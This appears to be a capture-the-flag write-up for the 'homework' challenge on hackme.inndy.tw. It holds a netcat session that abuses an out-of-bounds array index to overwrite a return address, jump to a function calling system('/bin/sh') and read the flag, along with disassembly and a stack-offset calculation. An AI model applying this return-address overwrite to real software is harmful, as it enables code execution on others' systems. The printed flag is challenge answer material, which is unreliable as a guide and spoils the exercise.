@@ -1,0 +1,87 @@
+root@kali:~/Downloads# nc hackme.inndy.tw 7701
+What's your name? nice
+0 > exit
+1 > edit number
+2 > show number
+3 > sum
+4 > dump all numbers
+ > 1
+Index to edit: 14
+How many? 134514171
+0 > exit
+1 > edit number
+2 > show number
+3 > sum
+4 > dump all numbers
+ > 0
+ls
+flag
+homework
+run.sh
+cat flag
+FLAG{Yoooo, Index Over Flow in my home work......OeAbaFeGeLaF9dEQ}
+
+134514171=0x080485FB
+.text:080485FB ; void call_me_maybe()
+.text:080485FB                 public call_me_maybe
+.text:080485FB call_me_maybe   proc near
+.text:080485FB ; __unwind {
+.text:080485FB                 push    ebp
+.text:080485FC                 mov     ebp, esp
+.text:080485FE                 sub     esp, 8
+.text:08048601                 sub     esp, 0Ch
+.text:08048604                 push    offset command  ; "/bin/sh"
+.text:08048609                 call    _system
+.text:0804860E                 add     esp, 10h
+.text:08048611                 nop
+.text:08048612                 leave
+.text:08048613                 retn
+.text:08048613 ; } // starts at 80485FB
+.text:08048613 call_me_maybe   endp
+
+
+
+public run_program
+.text:080486A2                 push    ebp
+.text:080486A3                 mov     ebp, esp
+
+
+.text:0804875D                 sub     esp, 0Ch        ; jumptable 0804875B case 1
+.text:08048760                 push    offset aIndexToEdit ; "Index to edit: "
+.text:08048765                 call    _printf
+.text:0804876A                 add     esp, 10h
+.text:0804876D                 sub     esp, 8
+.text:08048770                 lea     eax, [ebp+i]
+.text:08048773                 push    eax
+.text:08048774                 push    offset aD       ; "%d"
+.text:08048779                 call    ___isoc99_scanf
+.text:0804877E                 add     esp, 10h
+.text:08048781                 sub     esp, 0Ch
+.text:08048784                 push    offset aHowMany ; "How many? "
+.text:08048789                 call    _printf
+.text:0804878E                 add     esp, 10h
+.text:08048791                 sub     esp, 8
+.text:08048794                 lea     eax, [ebp+v]
+.text:08048797                 push    eax
+.text:08048798                 push    offset aD       ; "%d"
+.text:0804879D                 call    ___isoc99_scanf
+.text:080487A2                 add     esp, 10h
+.text:080487A5                 mov     eax, [ebp+i]
+.text:080487A8                 mov     edx, [ebp+v]
+.text:080487AB                 mov     [ebp+eax*4+arr], edx
+.text:080487AF                 jmp     loc_8048873
+
+栈溢出
+栈地址					栈值
+ebp+arr=ebp-0x34
+...
+ebp-8
+ebp-4
+ebp                     ebp
+                        ret返回地址
+						
+						
+ebp+4=ebp-0x34+0x38=ebp-0x34+4*14
+
+134514171=0x080485FB
+.text:080485FB ; void call_me_maybe()
